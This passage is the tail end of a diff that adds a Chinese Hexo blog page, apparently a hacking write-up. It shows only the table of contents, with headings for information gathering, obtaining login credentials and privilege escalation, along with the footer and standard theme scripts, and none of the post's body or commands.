+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于"><span class="nav-number">1.</span> <span class="nav-text">关于</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取登陆凭证"><span class="nav-number">3.</span> <span class="nav-text">获取登陆凭证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取用户"><span class="nav-number">4.</span> <span class="nav-text">获取用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
